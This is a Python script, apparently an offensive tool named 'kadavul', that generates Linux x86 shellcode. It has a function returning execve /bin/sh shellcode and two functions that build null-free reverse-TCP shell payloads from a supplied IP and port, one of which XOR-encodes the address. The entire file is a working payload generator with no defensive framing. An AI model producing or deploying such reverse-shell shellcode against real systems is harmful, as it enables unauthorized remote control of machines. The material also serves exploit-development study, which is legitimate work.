# =============================================
#  _                _                       _
# | |              | |                     | |
# | | __  __ _   __| |  __ _ __   __ _   _ | |
# | |/ / / _` | / _` | / _` |\ \ / /| | | || |
# |   < | (_| || (_| || (_| | \ V / | |_| || |
# |_|\_\ \__,_| \__,_| \__,_|  \_/   \__,_||_|
#
# =============================================
#!/bin/python3

def ip_conv(ip):
    ip_conv = ""
    ip_list = ip.split(".")
    for ele in ip_list:
        # zero pad hex values using string format<2 is passed as arg to zer0pad 1 byte>
        ip_conv += "\\x"+"{0:0{1}x}".format(int(ele), 2)
    return ip_conv


def hex_conv(hex_ip):
    hex_ip = hex_ip.replace('0x', "")
    ip_byte = ""
    # pass ip as little endain and add //x to each byte :)
    for i in range(int(len(hex_ip)), 1, -2):
        ip_byte += "\\x"+hex_ip[i-2:i]
    return ip_byte


def spawn_shell():
    # 25 bytes shellcode :)
    shell_spawn = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
    return shell_spawn


def rev_tcp(ip, port):
    ip = ip_conv(ip)
    x = '{0:04x}'.format(port)
    port = "\\x"+x[0:2]
    port += "\\x"+x[2:4]
    # 91 bytes shellcode :)
    rev_tcp_no_null = """\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x89\\xe5\\x52\\x52\\x68"""+ip+"""\\x66\\x68"""+port + \
        """\\x66\\x6a\\x02\\x31\\xc0\\x89\\xc3\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xca\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"""
    return rev_tcp_no_null


def rev_tcp_xor(A, B, port):
    # xor hex(ip) with another hex(A)  -> hex(B)=hex(ip) xor hex(A)
    # [ hex(A) and hex(B) should be null free]
    # 99bytes shellcode :)
    A = hex_conv(A)
    B = hex_conv(B)
    x = '{0:04x}'.format(port)
    port = "\\x"+x[0:2]
    port += "\\x"+x[2:4]
    rev_tcp_xor = """\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x89\\xe5\\x52\\x52\\xb8"""+B+"""\\xbb"""+A+"""\\x31\\xd8\\x50\\x66\\x68"""+port + \
        """\\x66\\x6a\\x02\\x31\\xc0\\x89\\xc3\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xca\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"""
    return rev_tcp_xor
